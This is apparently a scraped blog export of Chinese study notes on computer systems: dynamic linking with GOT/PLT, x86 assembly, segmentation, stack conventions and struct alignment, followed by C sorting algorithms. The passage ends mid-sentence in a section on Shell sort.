创建一个可执行的目标文件main，而此文件的形式使得它在运行时可以跟math.so文件链接 加载器不会像静态文件那样将控制传递给应用，而是加载和运行这个动态链接器，链接器执行下面的重定位完成链接任务： 重定位lib.so的文本和数据到某个内存段 重定位math.so的文本和数据到另一个内存段 重定位main中所有对由libc.so和math.so定义的符号的引用 2.与位置无关代码可以加载而无需重定位的代码称为位置无关代码（PIC）。 在一个X86_64系统中，对同一个目标模块中符号的引用是不需要特殊处理使之成为PIC。可以用PC相对寻址来编译这些引用，构造目标文件时由静态链接器重定位，对共享模块定义的外部过程和对全局变量的引用需要一些特殊的技巧。 1.PIC数据引用无论内存在何处加载一个目标模块(包括共享模块)，数据段与代码段的距离总是保持不变(即在内存的相对位置保持不变)，全局变量PIC，它在数据段开始的地方创建一个全局偏移量表(Global Offset Table，GOT)。在GOT中，每个被这个模块引用的全局数据目标(函数或全局变量)都有8个字节的条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含目标的正确绝对地址。每个引用全局目标的目标模块都有自己GOT. 2.PIC函数调用对于数量庞大的库文件来说，把函数地址的解析推迟到实际调用的地方，延迟绑定能避免动态链接器在加载时进行成百上千个其实并不需要的重定位。第一次调用过程的运行开销很大，但是其后的每次调用只会花费一条指令和一个间接的内存引用。 延迟规定是两个数据结构：GOT和过**程链接表(Procedire Linkage Table，PLT)**。 GOT表示数据段的一部分；PLT是代码段的一部分 PLT PLT是一个代码数组，其中每个条目是16字节代码，PLT[0]是一个特殊条目，跳转到动态链接器中。每个被可执行程序调用的库函数都有自己的PLT条目，每个条目负责调用一个具体的函数。PLT[1]调用启动函数(_ _libc_start_main)，由该函数来初始化执行环境，调用main函数并且处理返回值。从PLT[2]开始的条目为用于调用其他模块的函数。 GOT GOT是一个数组，其中的每个条目是8字节代码。和PLT联合使用，GOT[0]和GOT[1]包含动态链接器在解析函数地址时会使用到的信息。GOT[2]是动态链接器在ld-linux.so模块中的入口点。其余的每个条目对应于一个被调用的函数，其地址需要在运行时被解析。每个条目都有想对应的PLT条目。初始时，每个GOT条目都指向对应PLT条目的第二条指令。 延迟绑定调用的步骤： 第一次调用：首先控制流先到PLT[4]中，假设PLT[4]如下，其首行命令跳转的目标是对应的GOT表的条目，但此时的GOT表的条目对应地址是PLT[4]第二条的push，push完之后执行104b地址的命令，跳转到了PLT[0]继续压参数跳到GOT[2]解析地址然后往GOT表中填入绝对地址 第二次调用：跳转PLT-&gt;GOT对应的条目就可直接拿到函数的绝对地址 12340000000000001040 &lt;all_add@plt&gt;: 1040: ff 25 da 2f 00 00 jmpq *0x2fda(%rip) # 4020 &lt;all_add&gt; 1046: 68 01 00 00 00 pushq $0x1 104b: e9 d0 ff ff ff jmpq 1020 &lt;.plt&gt;","categories":[{"name":"深入理解计算机系统","slug":"深入理解计算机系统","permalink":"http://example.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"计算机系统","slug":"计算机系统","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"}]},{"title":"汇编语言","slug":"汇编语言/汇编语言","date":"2020-12-15T05:35:59.000Z","updated":"2021-04-01T14:10:18.000Z","comments":true,"path":"2020/12/15/汇编语言/汇编语言/","link":"","permalink":"http://example.com/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/","excerpt":"","text":"1.指令集(CISC RISC)x86指令集： 向下兼容； 变长指令：1-15字节，多数为2-3字节长度； 多种寻址方式(可访问不对齐的内存地址) 指令集的通用寄存器个数有限 X86-32系统下拥有8个通用寄存器(X86-64扩张到16个) 至多只有一个操作数在内存中，另一个操作数为立即数或者寄存器 2.数的机器表示 机器字长：一般指计算机进行一次整数运算所能处理的二进制数据的位数(包括数据地址长度) 地址按照字节来定位：机器字中第一个字节的地址；相邻机器字的地址相差4或者8字节 机器字内的各个字节的排列：小端法：机器在内存中按照从最低有效字节到最高有效字节的顺序存储对象；大端法：机器在内存中按照从最高有效字节到最低有效字节的顺序存储对象 存储变量0x1234567，高位字节的十六进制值为0x01，而低位字节值为0x67 大端法（低位地址存数据高位；高位地址存数据低位）： 小端法（低位地址存数据低位；高位地址存数据高位）： 小端模式低存低 高存高 Windows Linux Android IOS基本都是运行小端模式 有符号数和无符号进行比较的时候是将bit位转化为无符号再进行比较 3.80386三种工作模式 实模式：操作相当于一个可进行32位快速运算的8086 保护模式：是80x86设计目标全部达到的工作模式，通过对程序使用的存储区采用分段、分页的存储管理机制，通过分级使用、互不干扰的的保护目的。能为每个任务提供一台虚拟处理器，使得各个任务单独执行，快速切换。 虚拟8086模式：保护模式下同时模拟多个8086处理器 通过保护模式，可以把虚拟地址空间映射到不同的物理地址空间，且在超出预设的空间范围会报错（一种保护机制的体现），且可以保证处于低特权级的代码无法访问搞特权级的数据（另外一种保护机制的体现）。 只有在保护模式下，80386的全部32位地址才能有效，可寻址高达4G字节的线性地址空间和物理地址空间，可访问64TB（有2^14^个段，每个段最大空间为2^32^字节）的虚拟地址空间，可采用分段存储管理机制和分页存储管理机制。 80386处理器6个段寄存器：CS DS SS ES FS GS 段寄存器长度为16位，其中13位代表内存段的一个编号，称为”段选择器”。将段寄存器中的高13位值作为索引来访问该表，从而获得64位的描述符表。 4.分段机制的地址转换 段选择子的结构 段描述符结构 分段机制将内存划分成以起始地址和长度限制这两个参数表示的内存块，这些内存块就称之为段。编译器把源程序编译成执行程序时用到的代码段、数据段、堆和栈等概念在这里可以与段联系起来，二者在含义上是一致的。 在保护模式下，特权级总共有4个，编号从0（最高特权）到3（最低特权）。有3种主要的资源受到保护：内存，I/O地址空间以及执行特殊机器指令的能力。在任一时刻，intel 80386 CPU都是在一个特定的特权级下运行的，从而决定了代码可以做什么，不可以做什么。这些特权级经常被称为为保护环（protection ring），最内的环（ring 0）对应于最高特权0，最外面的环（ring 3）一般给应用程序使用，对应最低特权3。在保护模式下，我们可以通过查看CS寄存器的最低两位来了解当前正在运行的处理器是处于哪个特权级。 从操作系统原理上看，编译器实际上采用基于分段的虚拟管理方式来生成执行程序的，即应用程序员看到的逻辑地址和位于计算机上的物理地址之间有映射关系，二者可以是不同的。 4.1分段模式的具体硬件操作过程如下： 根据指令的内容确定应该使用的段寄存器，比如取内存指令的内存地址所对应的数据段寄存器为DS； 根据段寄存器DS的值作为选择子，以此选择子值为**索引，在段描述符表（可理解为一个大数组）找到索引指向的段描述符**（可理解为数组中的元素）； 在段描述符中取出基地址域（段的起始地址）和地址范围域（段的长度）的值； 将指令内容确定的地址偏移，与地址范围域的值比较，确保地址偏移小于地址范围，这样是为了确保地址范围不会跨出段的范围；（第一层保护） 根据指令的性质（当前指令的CS值的低两位）确定当前指令的特权级，需要高于当前指令访问的数据段的特权级；（第二层保护）； 根据指令的性质(指令是做读还是写操作)，需要当前指令访问的数据段可读或可写；（第三层保护） 将DS指向的段描述符中基地址域的值加上指令内容中指定的访存地址段内偏移值，形成实际的物理地址（实现地址转换），发到数据地址总线上，到物理内存中寻址，并取回该地址对应的数据内容。 分段机制涉及4个关键内容：逻辑地址（Logical Address,应用程序员看到的地址，在操作系统原理上称为虚拟地址，以后提到虚拟地址就是指逻辑地址）、物理地址（Physical Address, 实际的物理内存地址）、段描述符表（包含多个段描述符的“数组”）、段描述符（描述段的属性，及段描述符表这个“数组”中的“数组元素”）、段选择子（即段寄存器中的值，用于定位段描述符表中段描述符表项的索引）。 虚拟地址到物理地址的转换主要分以下两步： 分段地址转换：CPU把虚拟地址（由段选择子selector和段偏移offset组成）中的段选择子值作为段描述符表的索引，找到表中对应的段描述符，然后把段描述符中保存的段基址加上段偏移值，形成线性地址（Linear Address，在操作系统原理上没有直接对应的描述，在没有启动分页机制的情况下，可认为就是物理地址；如果启动了分页机制，则可理解为第二级虚拟地址）。如果不启动分页存储管理机制，则线性地址等于物理地址。 分页地址转换，这一步中把线性地址转换为物理地址。（注意：这一步是可选的，由操作系统决定是否需要。） 上述转换过程对于应用程序员来说是不可见的。线性地址空间由一维的线性地址构成，在分段机制下的线性地址空间和物理地址空间对等。线性地址32位长，线性地址空间容量为4G字节。分段机制中虚拟地址到线性地址转换转换的基本过程如下图所示。 4.2段选择子结构(段寄存器中的值16位)：是用来选择哪个描述表和该表中索引哪个描述符。选择子可以做为指针变量的一部分，从而对应用程序员是可见的，但是一般是由编译器和链接工具来设置的。段选择子的内容一般放在段寄存器中，选择子的格式如下图所示： 索引（Index）：段寄存器中的高13位值作为索引，在描述符表中从8192个描述符中选择一个描述符。处理器自动将这个索引值乘以8（描述符的长度位8字节），再加上描述符表(GDTR)的基址来索引描述符表，从而选出一个合适的描述符。 表指示位（Table Indicator，TI）：选择应该访问哪一个描述符表。0代表应该访问全局描述符表（GDT）；1代表应该访问局部描述符表（LDT）。 请求特权级（Requested Privilege Level，RPL）：用于段级的保护机制，比如，段选择子是CS，则这两位表示当前执行指令的处理器所处的特权级的值，从而你可以了解到当前处理器是处于用户态（Ring 3）还是内核态（Ring 0）。 4.3段描述符结构(8个字节64位)在分段存储管理机制的保护模式下，每个段由如下三个参数进行定义：段基地址(Base Address)、段界限(Limit)和段属性(Attributes)。 段基地址：即线性地址空间中段的起始地址。在80386保护模式下，段基地址长32位。基地址长度与寻址地址的长度相同，所以任何一个段都可以从32位线性地址空间中的任何一个字节开始，而不像实模式下规定边界必须被16整除。 段界限：规定段的大小。在80386保护模式下，段界限用20位表示：2^12^=4096，而且段界限可以是以单字节为最小单位或以4k字节为最小单位。 类型（TYPE）：用于区别不同类型的描述符。可表示所描述的段是代码段还是数据段，所描述的段是否可读/写/执行，段的扩展方向等。 描述符特权级（Descriptor Privilege Level）（DPL）：用来实现保护机制。 段存在位（Segment-Present bit）：如果这一位为0，则此描述符为非法的，不能被用来实现地址转换。如果一个非法描述符被加载进一个段寄存器，处理器会立即产生异常。图2显示了当存在位为0时，描述符的格式。操作系统可以任意的使用被标识为可用（AVAILABLE）的位。 已访问位（Accessed bit）：当处理器访问该段（当一个指向该段描述符的选择子被加载进一个段寄存器）时，将自动设置访问位。操作系统可清除该位。 上述表示段的属性的参数通过段描述符(Segment Descriptor)来表示，一个段描述符占8字节。段描述符的结构如下图所示： 4.4全局描述符表(GDT)全局描述符表的是一个保存多个描述符的“数组”，其起始地址保存在全局描述符表寄存器GDTR。GDTR长48位，其中高32位为基地址，低16位为段界限。由于GDT 不能用GDT本身之内的描述符进行描述定义，所以采用GDTR寄存器来表示GDT这一特殊的系统段。注意，全部描述符表中第一个段描述符设定为空段描述符。GDTR中的段界限以字节为单位。对于含有N个描述符的描述符表的段描述符实际所占空间通常可设为8N，若起始地址为gdt_base，则结束地址为gdt_base+8N-1。 全局描述符表的第一项是不能被CPU使用，所以当一个段选择子的索引（Index）部分和表指示位（Table Indicator）都为0的时（即段选择子指向全局描述符表的第一项时），可以当做一个空的选择子。当一个段寄存器被加载一个空选择子时，处理器并不会产生一个异常。但是，当用一个空选择子去访问内存时，则会产生异常。 T1=0描述符n给出目的地址的基址与限长 T1=1描述符x给出目的地址的基地址与限长(先访问GDT，再定位LDT的地址去拿到LDT中存的基地址) 4.4分段机制的系统寄存器80386有4个寄存器来寻址描述表等系统数据结构，用来实现段式内存管理。内存管理寄存器包括： 全局描述符表寄存器 (Global Descriptor Table Register，GDTR )48bit：指向全局段描述符表 GDT：主要存放操作系统和各任务公用的描述符 局部描述符表寄存器 (Local Descriptor Table Register，LDTR)：指向局部段描述符表 LDT （目前用不上） 中断门描述符表寄存器 (Interrupt Descriptor Table Register，IDTR)：指向一张包含中断处理子程序入口点的表（IDT） 任务寄存器 (Task Register，TR)：这个寄存器指向当前任务信息存放处，这些信息是处理器进行任务切换所需要的。（目前用不上） 80386有四个32位的控制寄存器，分别命名位CR0、CR1、CR2和CR3。CR0包含指示处理器工作方式、启用和禁止分页管理机制、控制浮点协处理器操作的控制位。具体描述如下： PE（保护模式允许 Protection Enable，比特位 0）：设置PE 将让处理器工作在保护模式下。复位PE将返回到实模式工作。 PG（分页允许 Paging， 比特位 31）： PG 指明处理器是否通过页表来转换线性地址到物理地址。在后续试验中将讲述如何设置PG位。 CR0中的位5~位30是保留位，这些位的值必须为0。CR2及CR3由分页管理机制使用，将在后续试验中讲述。在80386中不能使用CR1，否则会引起无效指令操作异常。 5.一些特殊的命令 5.1其中movs是符号扩展 movz是零扩展5.2加载有效地址lea加载有效地址(load effective address)指令leaq实际上是movq指令的变形。它的指令形式是从内存读数据到寄存器，但实际上它根本就没有引用内存。 下面是两种用法： 1.它的第一个操作数看上去是一个内存引用，但该指令并不是从指定位置读入数据，而是将有效地址写入到目的操作数。这条指令可以为后面的内存引用产生指针 2.它还可以简洁描述普通的算术操作。编译器经常发现leaq的一些灵活用法，根本就与有效地址计算无关。目的操作数必须是一个寄存器 6.条件码 CF Carry(进位)Flag 最近的操作使最高位产生了进位。可用来检查无符号操作的溢出。 SF Sign Flag 最近的操作得出的结果为负数。 ZF Zero Flag 最近的操作得出的结果是0。 OF Overflow Flag 最近的操作导致一个补码溢出——正溢出或者负溢出。 条件码由算术指令隐含设置 addl Src,Dest addq Src,Dest t=a+b (a=Src,b=Dest) CF set if (unsigned) t &lt; (unsigned) a 无符号溢出ZF set if t ==0 零SF set if t &lt;0 负数OF set if (a&lt;0==b&lt;0) &amp;&amp; (t&lt;0!=a&lt;0) 有符号溢出CMP指令cmpl src2,src1 (cmpl b,a 类似与计算a-b(但是不改变目的操作数)) ZF=1 cmp的结果为0，两数相等无符号：CF=1 有进位或借位，由于cmp是减操作，所a&lt;b，此时的计算结果已经发生溢出CF=0 则说明无借位，但要注意此时的ZF是否为0，若为0，则说明结果不为0，所以此时a&gt;b有符号(SF是计算结果为负数置1)：若SF=0，OF=0 则说明了此时的值为正数，没有溢出 a&gt;b若SF=1，OF=0 则说明了此时的值为负数，没有溢出，则为a&lt;b若SF=0，OF=1 则说明了此时的值为正数，有溢出，可以看出a&lt;b；此时的(a&lt;0 b&gt;0)若SF=1，OF=1则说明了此时的值为负数，有溢出，可以看出a&gt;b；此时的(a&gt;0,b&lt;0)Test指令testl src2,src1(计算src1 &amp; src2 并设置相应的条件码，不改变操作目的数) ZF set if a&amp;b=0SF set if a&amp;b&lt;0 (最高位的符号位为1)test指令同时使CF、OF为0 test指令两个操作数一般都是一样的，主要来操作数是负数、零、正数 7.读取条件码(只存入一个字节) 无符号数：大于等于ae(above equal) 小于等于be(below equal) 有符号数：大于等于ge(great equal)小于等于le(less equal) SetX指令：读取当前的条件码(或者某些条件码的组合)，并存入目的“字节”寄存器 余下的三个字节不会被修改 通常使用movezbl指令对目的寄存器进行“0”扩展 b-&gt;double word X86-64位机器： SetX指令读取当前的条件码(或者某些条件码的组合)，并存入目的“字节”寄存器，并且余下的七个字节不会被修改 123int gt(long x,long y)&#123; return x&gt;y;&#125; 123xorl %eax,%eax #自身异或，将eax清0，由于x64的特性，对第32位的结果会自动进行0扩展，此时的rax整个为0cmpq %rsi,%rdi #compare x:y setg %al 8.跳转指令 9.条件传送指令comvC src,dest 12cmpl %esi,%edi #x:ycmovle %edx,%eax 条件传送指令：如果条件C满足，将数据从src传送到dest；比一般的条件跳转指令的效率高，因为其控制流可预测(即条件C是已知的) 10.循环的汇编表示所有循环模式都转换成do-while，再转换成汇编形式 1.”Do-Whlie”循环123456789int fact_do(int x)&#123; int result=1; do&#123; result *=x; x=x-1; &#125;while(x&gt;1); return result;&#125; 转化成goto版本: 12345678910int fact_goto(int x)&#123; int result=1;loop: result*=x; x=x-1; if(X&gt;1) goto loop; return result;&#125; 汇编代码: 123456789101112131415 movq %rsp, %rbp movl %edi, -20(%rbp) #x-&gt;-20(%rbp) movl $1, -4(%rbp) #1-&gt;-4(%rbp).L2: movl -4(%rbp), %eax imull -20(%rbp), %eax #result*=x movl %eax, -4(%rbp) #result -&gt; -4(%rbp) subl $1, -20(%rbp) #x-1 cmpl $1, -20(%rbp) # compare x:1 jle .L3 #小于等于结束 jmp .L2 #大于继续循环.L3: movl -4(%rbp), %eax popq %rbp ret 2.“while”循环while循环转成do while就是入口先做一层判断 123456789int fact_while(int x)&#123; int result=1; while(x&gt;1)&#123; result*=x; x=x-1; &#125;; return result;&#125; 转化成goto版本: 123456789101112int fact_while_goto(int x)&#123; int result=1;loop: if((!x&gt;1)) goto done; result*=x; x=x-1; goto loop;done: return result;&#125; 汇编代码： 12345678910111213141516 pushq %rbp movq %rsp, %rbp movl %edi, -20(%rbp) movl $1, -4(%rbp).L3: cmpl $1, -20(%rbp)#先判断x是否大于1 jle .L2 movl -4(%rbp), %eax imull -20(%rbp), %eax movl %eax, -4(%rbp) subl $1, -20(%rbp) jmp .L3.L2: movl -4(%rbp), %eax popq %rbp ret 3.“For”循环For-&gt;while-&gt;Do_while 123456int result;for(result=1;p!=0;p=&gt;&gt;1)&#123; if(p&amp;0x1) result*=x; x=x*x;&#125; 11.Switch的汇编表示 使用一组if-then-else语句来实现 使用跳转表 表结构： ·每个表项(及跳转地址)占4个字节 ·基地址.L62 jmp *.L62(,%edx,4)把.L62做为起始地址，计算结果.L62+%edx*4 上面的*表明这个是一个间接跳转，即目标地址存于内存地址中 X86-64跳转表： 123456789101112131415161718192021long switch_eg(int x,int y,int z)&#123; long w=1; switch(X)&#123; case 1: w=y*z; break; case 2: w=y/z; case 3: w+=z; break; case 5: case 6: w-=z; break; default: w=2; &#125; return w;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 pushq %rbp movq %rsp, %rbp movl %edi, -20(%rbp) #x-&gt; -20(%rbp) movl %esi, -24(%rbp) #y-&gt; -24(%rbp) movl %edx, -28(%rbp) #z-&gt; -28(%rbp) movq $1, -8(%rbp) #w-&gt; -8(%rbp) cmpl $6, -20(%rbp) #x:6 jg .L2 #跳default cmpl $5, -20(%rbp) jge .L3 cmpl $3, -20(%rbp) je .L4 cmpl $3, -20(%rbp) jg .L2 cmpl $1, -20(%rbp) je .L5 cmpl $2, -20(%rbp) je .L6 jmp .L2.L5: movl -24(%rbp), %eax imull -28(%rbp), %eax cltq movq %rax, -8(%rbp) jmp .L7.L6: movl -24(%rbp), %eax cltd idivl -28(%rbp) cltq movq %rax, -8(%rbp).L4: movl -28(%rbp), %eax cltq addq %rax, -8(%rbp) jmp .L7.L3: movl -28(%rbp), %eax cltq subq %rax, -8(%rbp) jmp .L7.L2: movq $2, -8(%rbp).L7: movq -8(%rbp), %rax popq %rbp ret 12.x86-32的程序栈 1.x86-32寄存器使用惯例过程yoo调用who yoo：caller who：callee 通用寄存器分成两类：“调用者负责保存” 调用者caller在调用子过程之前将这些寄存器内容存储在它的栈帧内 “被调用者负责保存” 被调用callee在使用这些寄存器之前将其原有的内容存储在它的栈帧内 2.递归调用12345678int rfact(int x)&#123; int rval; if(x&lt;=1) return 1; rval=rfact(x-1); return rval*x;&#125; 12345678910111213141516171819 pushq %rbp movq %rsp, %rbp subq $32, %rsp movl %edi, -20(%rbp) cmpl $1, -20(%rbp) jg .L2 movl $1, %eax jmp .L3.L2: movl -20(%rbp), %eax subl $1, %eax movl %eax, %edi call _Z5rfacti movl %eax, -4(%rbp) movl -4(%rbp), %eax imull -20(%rbp), %eax.L3: leave ret 13.x86-64的程序栈 寄存器 寄存器作用 寄存器 寄存器作用 %rax 返回值 %r8 第五个参数 %rbx 被调用者保存 %r9 第六个参数 %rcx 第四个参数 %r10 被调用者保存 %rdx 第三个参数 %r11 Use for linking %rsi 第二个参数 %r12 被调用者保存 %rdi 第一个参数 %r13 被调用者保存 %rsp 栈顶寄存器 %r14 被调用者保存 %rbp 被调用者保存 %r15 被调用者保存 14.数组的访问 二维数组访存 1234567int fie_ele(int a[3][3],int i,int j)&#123; return a[i][j];&#125;int main()&#123; int a[3][3]=&#123;0&#125;; fie_ele(a,1,2);&#125; 12345678910111213141516171819pushq %rbpmovq %rsp, %rbpmovq %rdi, -8(%rbp)movl %esi, -12(%rbp)movl %edx, -16(%rbp)movl -12(%rbp), %eax #imovslq %eax, %rdx #符号扩展 #imovq %rdx, %rax #iaddq %rax, %rax #i+iaddq %rdx, %rax #3*i C=3 salq $2, %rax #3*i*4 K=4movq %rax, %rdx #rdx=3*i*4movq -8(%rbp), %rax #a的地址addq %rax, %rdx #地址加上行movl -16(%rbp), %eaxmovl (%rdx,%rax,4), %eax#地址加上列popq %rbpret 地址: A+ix(CxK)+jxk 对于以上的数组C=3 K=4 15.结构的存储12345struct rec&#123; int i; int a[3]; int *p&#125;; 连续分配的内存区域； 内部元素通过名字访问； 且元素可以是不同的数据类型 1.数据存储位置对齐对齐的一般原则： 已知某种数据类型的大小为K字节，那么其存储地址必须是K的整数倍,，普通数据类型(1,2,4,8) 对齐的原因： 计算机访问内存一般是以内存块为单位，块的大小是地址对齐，如4,8,16字节对齐等 如果数据访问地址跨越”块”边界会引起额外的内存访问 编译器的工作： 在结构的各个元素间插入额外空间来满足不同元素的对齐要求 2.x86-32下不同元素的对齐要求2.1基本数据类型： 字节 举例 对齐方式 1 byte char 无要求 2 bytes short 2字节对齐 地址最后一位为0 4 bytes int float 4字节对齐 地址最后两位为0 8 bytes double 8字节对齐 地址最后三位为0(Windows) 4字节对齐 地址最后两位为0(Linux) 以上是32位机器的对齐方式，而对于64位机器8字节都是8字节对齐方式 2.2*结构的存储对齐要求： 必须满足结构中各个元素的对齐要求 结构自身的对齐要求等于其各个元素中对齐要求最高的那个，设为k字节 结构的起始地址与结构长度必须是k的整数倍 12345struct s1&#123; char c; int i[2]; double v;&#125; 在windows系统或者x86-64系统下：K=8 在x86-32的Linux系统：K=4 2.3结构数组的对齐方式： 3.联合 对于联合来说一次只能使用其中一个成员，上面的联合才占据8个字节 16.汇编举例 17.系统调用 x86-Linux下的系统调用时通过中断指令(int 0x80)来实现的 在执行int $0x80指令时 寄存器eax中存放的是系统调用的功能号，而传给系统调用的。 参数则必须按顺序放到寄存器ebx，ecx，edx，esi，edi中 当系统调用完成之后，返回值可以在寄存器中eax中获得 当一个系统调用所需的参数个数大于5时 需将系统调用功能号保存在寄存器eax中，全部参数一次连续放在一块连续的内存区域里，同时寄存器ebx中保存指向该内存区域的指针 先把参数先放入寄存器，再系统调用 18.汇编调用lib_c库函数CPUID指令是一条汇编指令，它是请求处理器的特定信息并把信息返回到特定寄存器的低级指令。 CPUID指令使用单一寄存器作为输入，EAX寄存器用于决定CPUID指令生成什么信息。 根据EAX寄存器的值，CPUID指令在EBX，ECX和EDX寄存器中生成关于处理器的不同信息。 12movl $0,%eaxcpuid 当0倍放入到%eax寄存器并且执行CPUID指令时，处理器把厂商ID字符串返回到EBX，EDX和ECX寄存器中 程序结构： 主要分成三个段： .data 数据段 声明带有初始值的元素 .bss 数据段 声明无需初始化的元素 .text 正文段 程序指令 每个汇编程序都必须包含此段 程序入口地址 汇编器使用_start符号表示默认的起始点，此外如果想要汇编内部的符号能够被外部模块访问，需要赋予.globl属性，如： .globl _start 19.程序结构1.数据段 .data只读数据段 .rodata：声明一个数据元素时，需要使用Symbol和类型说明 1234567output: .ascii &quot;hello world.&quot;pi: .float 2.14#声明可以在一行中定义多个值：ages: .int 20,10,30,40 2.bss段bss段：和data段不同，无需声明特定的数据类型，只需声明为所需目的保留的原始内存部分即可 .comm声明为未初始化的全局内存区域 .lcomm声明为未初始化的本地内存区域(局部变量) 123.section .bss .lcomm buffer,1000 #该语句把1000字节的内存地址赋予buffer，外部模块不能访问他们 20.程序链接 linking1.静态链接(Static Linking)2.链接步骤：1.符号解析 程序定义以及引用了一系列符号(symbols，包含变量与函数) void swap(){} swap() 编译器将符号定义存储在符号表(symbol table)中 链接器将每一个符号引用于符号定义联系起来 链接符号： 全局符号：某一个模块定义、且可以被其他模块引用的变量或者函数符号(全局非静态函数或者变量) 外部符号：某个模块引用的由其他模块定义的全局符号(extern) 局部符号：由某个模块定义且仅有该模块引用的符号(静态的函数或者变量) 2.重定位 将多个文件的数据、代码段集成为单一的数据段和代码段 将.o文件中的符号解析为绝对地址 然后将所有的符号引用更新为这些新的地址 3.三种不同的对象文件 重定向对象文件(.o文件) 含有一定格式的代码与数据内容，可以与其他重定向对象文件一起集成为执行文件(一个.o文件由唯一的一个源文件生成) 执行文件(a.out文件) 含有一定格式的代码与数据内容，可以直接被装载入内存并执行 共享对象文件(.so文件) 特殊类型的重定向对象文件，可以被装载入内存后进行动态链接；链接可以在装载时或者运行时完成 Windows系统下被称为DDL文件 4.ELF文件格式LINUX下的可执行文件格式为ELF；ELF文件的全称是Executable and Linkable Format，意为可执行的、可连接的格式。","categories":[{"name":"汇编语言","slug":"汇编语言","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"}],"tags":[{"name":"汇编语言","slug":"汇编语言","permalink":"http://example.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"}]},{"title":"数据结构-排序、查找算法","slug":"数据结构/数据结构-排序、查找算法","date":"2020-12-07T08:53:46.000Z","updated":"2021-04-01T14:12:14.000Z","comments":true,"path":"2020/12/07/数据结构/数据结构-排序、查找算法/","link":"","permalink":"http://example.com/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/","excerpt":"","text":"一、排序算法 冒泡排序、双向冒泡排序 选择排序 插入排序、二分法插入排序、希尔排序 快速排序(递归与非递归) 归并排序(递归与非递归) 堆排序 1.冒泡排序、双向冒泡排序 冒泡排序通过两两不断比较，如果后者比前者大，那就继续比较，反之，交换两者的数值，直到最后一个元素，最后的到的数值应该就是未排序序列中的最大值。双向冒泡排序(按照其中一种情况)将序列的最大值往右移、序列的最小值往左移。 普通冒泡排序： 12345678910111213void bubbleSort(int arry[],int length)&#123; //把最大的数冒泡到最后面 for(int i=0;i&lt;length-1;i++)&#123; int flag=0; for(int j=0;j&lt;length-i-1;j++)&#123; if(arry[j]&lt;arry[j+1])&#123; Swap(arry[j],arry[j+1]); flag=1; &#125; &#125; if(flag==0) break; &#125;&#125; 此算法的改进是加一个flag，当flag为0的时候代表的着遍历的过程已经满足排序的要求，可以直接退出。 而对于双向冒泡排序，按照其中一种情况，大的往后冒，小的往前冒，在第一层循环中加两个循环 双向冒泡排序： 12345678910111213141516171819202122232425void double_BubbleSort(int arry[],int length)&#123; int low=0; int high=length-1;//不管是双向还是单向 判断往右冒的时候如果是i+1 为了不越界 右界应该都为length-1 int flag=0; while (low&lt;high) &#123; //正向冒泡 找出最大值 for(int i=low;i&lt;high;i++)&#123; if(arry[i]&gt;arry[i+1])&#123; Swap(arry[i],arry[i+1]); flag=1; &#125; &#125; if(flag==0) break; high--; //反向冒泡 找出最小值 已经存在一个最大值 for(int i=high;i&gt;low;i--)&#123; if(arry[i]&lt;arry[i-1])&#123; Swap(arry[i],arry[i-1]); &#125; &#125; low++; &#125;&#125; 2.选择排序 选择排序外层循环一开始假设i下标是最大值或者最小值放入k中，通过内层循环去遍历整个序列，如果序列中有比它大的值，将该值的下标放入k中。循环完成之后看下标是否有发生变化，有发生变化，交换i与k的值。 12345678910111213void SelectSort(int arry[],int length)&#123; //选择最小的数然后放到前面 for(int i=0;i&lt;length-1;i++)&#123; int k=i; for(int j=i+1;j&lt;length;j++) if(arry[k]&gt;arry[j]) k=j; if(k!=i)&#123; int temp=arry[k]; arry[k]=arry[i]; arry[i]=temp; &#125; &#125;&#125; 3.插入排序、二分法插入排序、希尔排序3.1、简单插入排序 插入排序是先遍历一遍序列，然后遍历到i的值与前面已经排好的序列的值进行比对，找到插入的位置k，k-i-1的值全部往后移动一个单位，然后i的值插入k的位置 123456789101112131415void InsertSort(int arry[],int length)&#123; for(int i=1;i&lt;length;i++)&#123; int tmp=arry[i]; int j; for(j=i-1;j&gt;=0;j--)&#123; if(arry[j]&lt;tmp)&#123; arry[j+1]=arry[j]; &#125;else &#123; break; &#125; &#125; arry[j+1]=tmp; &#125;&#125; 其中tmp来保存外层循环遍历的值，arry[j+1]=arry[j]该操作将找到位置的值全部往后移动一个单位。 3.2、二分法插入排序二分法插入排序的核心思想跟简单插入排序一样，唯一不同就是在查找的过程使用二分法，可以使得查找的时间明显减少 123456789101112131415161718192021222324void BinaryInsertSort(int arry[],int length)&#123; //主要核心在与前面有序序列的二分法的查找 //如果没查到该元素 right的位置在middle-1 而left在middle //此时的tmp小于等于left所在的值 平移i到left的所有元素 left原来的位置直接给tmp for(int i=1;i&lt;length;i++)&#123; int j; int tmp=arry[i]; int middle,left=0; int right=i-1; while(left&lt;=right)&#123; middle=(left+right)/2; if(arry[middle]&gt;tmp) right=middle-1; else &#123; left=middle+1; &#125; &#125; for(j=i-1;j&gt;=left;j--) arry[j+1]=arry[j]; arry[left]=tmp; &#125;&#125; 例子：25 56 10 58 3使用二分法插入排序， i从1开始也就是56，此轮二分法遍历完成后left=1 middle=right=1此轮不用移动 25 56 10 58 3 i从2开始也就是10，此轮二分法遍历完成后left=middle=0 right=-1此轮25 56都需要往右移动 10 25 56 58 3 ······ 如果在该序列中所有的元素都比tmp小，代表着不需要移动，此时的left应该是加到i的位置，如上面第一轮的情况 arry[left]=tmp;这个就比较容易理解。 3.2、希尔排序 在上图中，希尔排序通过每次有一个增量，将处于该增量的元素进行一个插入排序，通过第二趟排序很容易理解，首先是增量为2，所以增量内的第一轮的元素应该是4 5 5第二轮是1 3 9 6 